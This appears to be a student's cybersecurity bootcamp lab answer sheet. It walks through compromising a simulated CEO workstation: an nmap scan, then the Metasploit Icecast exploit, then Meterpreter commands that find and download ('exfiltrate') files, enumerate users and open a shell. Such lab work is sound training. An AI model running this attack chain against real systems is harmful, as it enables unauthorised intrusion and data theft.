You've been provided full access to the network and are getting ping responses from the CEO’s workstation.


Perform a service and version scan using Nmap to determine which services are up and running:


Run the Nmap command that performs a service and version scan against the target.

Answer: nmap -sV 192.168.0.6 





From the previous step, we see that the Icecast service is running. Let's start by attacking that service. Search for any Icecast exploits:


Run the SearchSploit commands to show available Icecast exploits.

Answer: searchsploit icecast




Now that we know which exploits are available to us, let's start Metasploit:


Run the command that starts Metasploit:

Answer: msfconsole





Search for the Icecast module and load it for use.


Run the command to search for the Icecast module:

Answer: search icecast

![search_icecast](https://github.com/shansen18/BootCamp/blob/d4348fcf0f79e669ebb3d1948b923f38479c7b90/Week17/images/Search_Icecast.JPG)


Run the command to use the Icecast module:
Note: Instead of copying the entire path to the module, you can use the number in front of it.

Answer: use 


![use_exploit](https://github.com/shansen18/BootCamp/blob/d4348fcf0f79e669ebb3d1948b923f38479c7b90/Week17/images/Use_exploit.JPG)


Set the RHOST to the target machine.


Run the command that sets the RHOST:

Answer: Set RHOST 192.168.0.6





Run the Icecast exploit.


Run the command that runs the Icecast exploit.

Answer: run

![run_exploit](https://github.com/shansen18/BootCamp/blob/d4348fcf0f79e669ebb3d1948b923f38479c7b90/Week17/images/set_RHOST_Run.JPG)

You should now have a Meterpreter session open.



Run the command that performs a search for the secretfile.txt on the target.

Answer: search -f *secretfile.txt -r




Run the command to performs a search for the recipe.txt on the target:

Answer: search -f *recipe.txt -r

![search_secret](https://github.com/shansen18/BootCamp/blob/d4348fcf0f79e669ebb3d1948b923f38479c7b90/Week17/images/search_secret.JPG)

Bonus: Run the command that exfiltrates the recipe*.txt file:

Answer: download "c:\Users\IEUser\Documents\Drinks.recipe.txt" "output file name"

![search_recipe](https://github.com/shansen18/BootCamp/blob/d4348fcf0f79e669ebb3d1948b923f38479c7b90/Week17/images/search_recipe.JPG)

![copy_recipe](https://github.com/shansen18/BootCamp/blob/d4348fcf0f79e669ebb3d1948b923f38479c7b90/Week17/images/download_recipe.JPG)

You can also use Meterpreter's local exploit suggester to find possible exploits.


Note: The exploit suggester is just that: a suggestion. Keep in mind that the listed suggestions may not include all available exploits.




Bonus
A. Run a Meterpreter post script that enumerates all logged on users.

Answer: run post/windows/gather/enum_logged_on_users 

![enum_users](https://github.com/shansen18/BootCamp/blob/d4348fcf0f79e669ebb3d1948b923f38479c7b90/Week17/images/enum_logged_on_users.JPG_)

B. Open a Meterpreter shell.

Answer: shell

C. Run the command that displays the target's computer system information:

Answer: sysinfo

![sysinfo](https://github.com/shansen18/BootCamp/blob/d4348fcf0f79e669ebb3d1948b923f38479c7b90/Week17/images/sysinfo.JPG)